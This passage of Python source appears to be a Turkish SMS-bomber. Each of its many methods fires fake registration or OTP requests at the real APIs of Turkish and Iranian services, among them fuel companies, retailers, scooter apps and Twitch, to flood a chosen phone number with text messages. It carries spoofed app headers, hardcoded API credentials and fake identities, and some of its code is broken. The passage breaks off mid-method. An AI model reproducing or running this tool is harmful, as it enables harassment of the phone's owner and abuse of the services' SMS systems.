            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
            
            
    #ipragaz.com.tr
    def GoMobile(self):
        try:
            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
            if (r.json()["data"]["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
            
    
    #totalistasyonlari.com.tr
    def Total(self):
        try:
            r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
            
            
    #opet.com.tr
    def Opet(self):
        try:
            url = "https://api.opet.com.tr:443/api/authentication/register"
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")


    #dolap.com
    def Dolap(self):
        try:
            url = "https://api-gateway.dolap.com:443/member"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
            json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
            r = requests.put(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com")
            

    #heymobility.tech
    def Hey(self):
        try:
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    #isbike.istanbul
    def Isbike(self):
        try:
            url = "http://app.isbike.istanbul:80/api/uye/otpsms"
            headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul")
            
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
            
    
    #joker.com.tr
    def Joker(self):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
            data = {"phone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")


    #e-bebek.com
    def Ebebek(self):
        try:
            r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
            auth = (r.json()["access_token"])
            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
            json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")


    #sakasu.com.tr
    def Saka(self):
        try:
            url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
            json={"gsm": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
            
    
    #gofody.com
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"
            json={"country_code": "90", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com")


    #madamecoco.com
    def Madame(self):
        try:
            url = "https://www.madamecoco.com:443/users/registration/"
            headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
            data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com")
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
        try:
            r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr")   
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")
            
    
    #koctas.com.tr
    def Koctas(self):
        try:
            url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
            data = {"givePermission": "true", "mobileNumber": self.phone}
            r = requests.post(url, data=data)
            if (r.json()["status"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr")
            
            
    #gratis.com
    def Gratis(self):
        try:
            token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
            url = "https://ivt.mobildev.com:443/data/0e80tyg8"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": self.phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com")
    
    
    #anadolu.com.tr
    def Anadolu(self):
        try:
            url = f"https://www.anadolu.com.tr:443/mobil/OneriSms2.php?Numara={self.phone}&NAME=Memati%20Bas"
            r = requests.get(url)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
            
            
    #accordors.com
    def Accordors(self):
        try:
            url = "http://aouws.accordors.com:80/api"
            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
            r = requests.post(url, json=json)
            if r.json()["data"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
            
    
    #hoplagit.com
    def Hop(self):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            json={"phone": f"+90{self.phone}"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")
            
    
    #gokarma.app
    def Karma(self):
        try:
            url = "https://api.gokarma.app:443/v1/auth/send-sms"
            json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
    
    def twitch(self):
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': {self.phone},'username': username})
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.twtitch.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.twitch.app")
    
    
    def snap(self):
        #snap api
        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        snapD = {"cellphone":phone}
        try:
            snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
            if "OK" in snapR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.snap.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.snap.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.snap.app")

    def shad(self):
        #shad api
        shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":self.phone("+")[1],"send_type":"SMS"}}
        try:
            shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
            if "OK" in shadR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.shad.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.shad.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.shad.app")

    def gap(self):
        #gap api
        gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
        try:
            gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(self.phone("+")[1]), headers=gapH, proxies=proxy)
            if "OK" in gapR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gap.app")
                self.adet += 1
            else:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gap.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gap.app")

    def tap30(self):
        #tap30 api
        tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        tap30D = {"credential":{"phoneNumber":"0"+self.phone("+90")[1],"role":"PASSENGER"}}
        try:
            tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=proxy)
            if "OK" in tap30R.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.tap30.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.tap30.app")
        except:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.tap30.app")

    def emtiaz(self):
        #emtiaz api
        emH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
